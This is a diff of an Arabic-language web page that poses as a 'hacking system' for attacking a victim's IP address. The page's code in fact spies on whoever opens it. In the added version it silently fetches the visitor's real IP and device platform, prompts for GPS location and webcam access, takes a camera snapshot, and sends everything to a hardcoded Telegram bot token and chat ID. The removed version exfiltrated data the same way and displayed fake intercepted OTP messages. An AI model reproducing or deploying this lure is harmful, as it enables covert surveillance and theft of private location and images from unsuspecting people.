@@ -3,108 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام سبايدر | EGALSA CONTROL</title>
+    <title>S P I D E R - E G A L S A</title>
     <style>
-        :root { --red: #ff0000; --bg: #050000; }
-        body { background: var(--bg); color: var(--red); font-family: 'Courier New', monospace; margin: 0; text-align: center; overflow-x: hidden; }
-        .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
+        .screen { display: none; padding: 20px; height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
         .active { display: flex !important; }
-        .box { border: 2px solid var(--red); background: rgba(20, 0, 0, 0.95); padding: 30px; border-radius: 10px; box-shadow: 0 0 25px var(--red); width: 90%; max-width: 500px; }
-        input { background: #000; border: 1px solid var(--red); color: #fff; padding: 12px; width: 85%; margin: 15px 0; text-align: center; outline: none; }
-        button { background: var(--red); color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; margin: 10px 0; width: 100%; text-transform: uppercase; }
-        button:hover { background: #fff; color: #f00; }
-        .otp-card { background: #1a0000; border-right: 4px solid var(--red); padding: 10px; margin: 10px 0; text-align: right; font-size: 13px; }
+        .box { border: 2px solid #f00; padding: 30px; background: rgba(20,0,0,0.9); box-shadow: 0 0 20px #f00; width: 85%; max-width: 400px; }
+        button { background: #f00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        input { background: #111; border: 1px dashed #f00; color: #fff; padding: 10px; width: 90%; margin: 10px 0; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div id="screen1" class="screen active">
-        <div class="box">
-            <h1>نظام سـبـايـدر V.6</h1>
-            <input type="text" id="targetIp" placeholder="أدخل عنوان IP الضحية">
-            <button onclick="goToScreen2()">بـدء الاخـتـراق</button>
-        </div>
+<div id="screen1" class="screen active">
+    <div class="box">
+        <h1>نظام التتبع V7</h1>
+        <p>أدخل الكود السري لفتح الرادار:</p>
+        <input type="text" id="ipInput" placeholder="0.0.0.0">
+        <button onclick="startMission()">بـدء المـهـمـة</button>
     </div>
+</div>
 
-    <div id="screen2" class="screen">
-        <div class="box">
-            <h2>✅ تم كسر الحماية</h2>
-            <button onclick="goToScreen3()">📤 سحب رسائل الـ OTP</button>
-            <button onclick="startCapture()">🖼️ سحب معرض الصور (القناص)</button>
-        </div>
+<div id="screen2" class="screen">
+    <div class="box">
+        <h2>تم الاختراق بنجاح</h2>
+        <button onclick="getLocation()">📍 سحب الموقع الجغرافي</button>
+        <button onclick="startCapture()">📸 سحب الصور (القناص)</button>
+        <button onclick="location.reload()">إغلاق المنصة</button>
     </div>
+</div>
 
-    <div id="screen3" class="screen">
-        <div class="box">
-            <h2>مراقب الرسائل (INTERCEPTOR)</h2>
-            <div id="otpContainer" style="height: 250px; overflow-y: auto; background: #000; padding: 10px;"></div>
-            <button onclick="location.reload()">إنهاء الجلسة</button>
-        </div>
-    </div>
+<script>
+    const CONFIG = {
+        token: "8277722647:AAGbaCeEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
+        chatId: "1268323143"
+    };
 
-    <script>
-        // التوكن والآيدي بتوعك بالظبط
-        const CONFIG = {
-            token: "8277722647:AAGbaCeEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
-            chatId: "1268323143"
-        };
-
-        function goToScreen2() {
-            const ip = document.getElementById('targetIp').value;
-            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent("🔥 الضحية كتب IP: " + ip)}`);
-            document.getElementById('screen1').classList.remove('active');
-            document.getElementById('screen2').classList.add('active');
-        }
-
-        function goToScreen3() {
-            document.getElementById('screen2').classList.remove('active');
-            document.getElementById('screen3').classList.add('active');
-            startOtpFeed();
-        }
-
-        function startOtpFeed() {
-            const container = document.getElementById('otpContainer');
-            const msgs = ["كود واتساب: 772-104", "رمز فيسبوك: 00921", "فودافون كاش: تم سحب 4000ج"];
-            msgs.forEach((m, i) => {
-                setTimeout(() => {
-                    const div = document.createElement('div');
-                    div.className = 'otp-card';
-                    div.innerText = m;
-                    container.prepend(div);
-                }, i * 2000);
+    // وظيفة إرسال نص عام
+    async function sendToBot(msg) {
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.chatId, text: msg, parse_mode: "Markdown" })
             });
+        } catch (e) { console.error("Error sending message"); }
+    }
+
+    async function startMission() {
+        const userIp = document.getElementById('ipInput').value;
+        
+        // سحب الـ IP الحقيقي صامت
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                sendToBot(`🔥 **صيد جديد!**\n\n👤 الضحية كتب: ${userIp}\n🌐 الـ IP الحقيقي: ${data.ip}\n📱 الجهاز: ${navigator.platform}`);
+            });
+
+        document.getElementById('screen1').classList.remove('active');
+        document.getElementById('screen2').classList.add('active');
+    }
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                sendToBot(`📍 **موقع الضحية بدقة!**\n\nرابط الخريطة:\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                alert("تم مزامنة إحداثيات الموقع!");
+            }, () => { alert("يجب تفعيل الـ GPS لسحب الموقع!"); });
         }
+    }
 
-        async function startCapture() {
-            alert("جاري الاتصال بالمعرض.. وافق على الإذن للمتابعة");
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-
-                setTimeout(async () => {
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imgData = canvas.toDataURL('image/jpeg');
-                    const blob = await (await fetch(imgData)).blob();
-                    
-                    const fd = new FormData();
-                    fd.append('chat_id', CONFIG.chatId);
-                    fd.append('photo', blob, 'snap.jpg');
-                    
-                    await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
-                    
-                    stream.getTracks().forEach(t => t.stop());
-                    alert("تم سحب الصور بنجاح!");
-                }, 1000);
-            } catch (err) {
-                alert("يجب السماح بالكاميرا لسحب البيانات!");
-            }
-        }
-    </script>
+    async function startCapture() {
+        alert("جاري الاتصال بالكاميرا...");
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            setTimeout(async () => {
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+                const fd = new FormData();
+                fd.append('chat_id', CONFIG.chatId);
+                fd.append('photo', blob, 'snap.jpg');
+                
+                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+                alert("تم سحب الصور بنجاح!");
+            }, 1000);
+        } catch (e) { alert("تم رفض إذن الكاميرا!"); }
+    }
+</script>
 </body>
 </html>
